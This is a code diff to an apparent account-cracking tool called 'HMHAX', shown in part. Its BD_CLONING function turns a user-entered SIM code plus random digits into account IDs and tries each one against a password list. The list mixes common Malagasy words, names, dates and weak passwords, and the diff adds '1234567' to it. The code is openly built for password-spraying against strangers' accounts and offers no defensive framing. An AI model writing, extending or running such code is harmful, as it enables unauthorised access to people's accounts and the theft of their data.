@@ -98,15 +98,12 @@ word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
 
 logo=(f'''{B}
-
 .__              .__                     
 |  |__    _____  |  |__  _____   ___  ___
 |  |  \  /     \ |  |  \ \__  \  \  \/  /
 |   Y  \|  Y Y  \|   Y  \ / __ \_ >    < 
 |___|  /|__|_|  /|___|  /(____  //__/\_ \
      \/       \/      \/      \/       \/
-
-                                    
 {warna}--------------------------------------------{B}
 TOOL NAME : {warna}{P}HMHAX{P}{warna}
 Owner: {M}HMHAX{M}
@@ -161,7 +158,7 @@ def BD_CLONING():
 
     clear()
 
-    print(' MG SIMCODE : [26132] [26134] [26138] [26133]')
+    print(' MG SIMCODE : [032] [034] [038] [033]')
 
     code=input(' ENTER SIMCODE >> ')
 
@@ -201,7 +198,7 @@ def BD_CLONING():
 
             ids=code+psx
 
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Anjara','anjara','Antananarivo','Malagasy','Judio99','Angelina','Malala','fitiavana','mamako','Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece' , 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234' , 'Freefire123', 'Freefire', 'freefire' , 'freefire123', '200609', '200409' , '200309', '200209', '202403', 'razana' , 'Razana' , '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'1234567','malala','Anjara','anjara','Antananarivo','Malagasy','Judio99','Angelina','Malala','fitiavana','mamako','Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece' , 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234' , 'Freefire123', 'Freefire', 'freefire' , 'freefire123', '200609', '200409' , '200309', '200209', '202403', 'razana' , 'Razana' , '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
 
             Dipto.submit(method_crack,ids,passlist)
 
